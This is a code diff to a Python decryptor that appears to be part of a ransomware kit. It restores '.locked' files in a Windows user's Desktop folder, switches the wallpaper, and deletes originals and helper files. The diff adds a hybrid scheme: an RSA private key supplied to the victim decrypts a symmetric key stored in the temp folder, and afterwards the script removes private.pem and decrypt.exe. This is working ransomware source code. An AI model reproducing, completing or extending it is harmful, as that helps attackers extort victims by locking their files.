@@ -1,5 +1,8 @@
 import nacl, nacl.secret, pathlib, os, ctypes 
 from time import sleep
+from Crypto.PublicKey import RSA
+from Crypto.Cipher import AES, PKCS1_OAEP
+from Crypto.Random import get_random_bytes
 def change_bg():
     ctypes.windll.user32.SystemParametersInfoW(20, 0, f'C:\\Users\\{User}\\wallpaper.jpg', 3)
 class Decrypt(object):                                     
@@ -19,8 +22,15 @@ class Decrypt(object):
         os.remove(EnFileN)                  
 
 User        =  os.getlogin()
-hexed_key    =  input('Enter the key to decrypt your files : ')
-box = nacl.secret.SecretBox(bytes.fromhex(hexed_key))                        
+encrypted_key_file = "C:/Users/"+User+"/appdata/local/temp/encrypted_key.txt"
+key_file = input('Enter the path to private key file : ')
+file_in = open(encrypted_key_file, "rb")
+hexed_key = file_in.read()
+private_key = RSA.import_key(open(key_file).read())
+cipher_rsa = PKCS1_OAEP.new(private_key)
+decMessage = cipher_rsa.decrypt(hexed_key)
+decMessage = decMessage.decode('utf-8')
+box = nacl.secret.SecretBox(bytes.fromhex(decMessage))                        
 Paths    = [r"C:/Users/"+User+"/Desktop/files"] 
 for  AllFiles in Paths:                                             
     if (pathlib.Path(AllFiles).exists()):                           
@@ -28,5 +38,7 @@ for  AllFiles in Paths:
             for file in files :                                 
                 if(".locked" in file):                             
                     FilePath    = os.path.join(path, file)      
-                    Decrypt(FilePath,box).FileE() 
+                    Decrypt(FilePath,box).FileE()             
 change_bg()
+os.remove('private.pem')
+os.remove('decrypt.exe')        
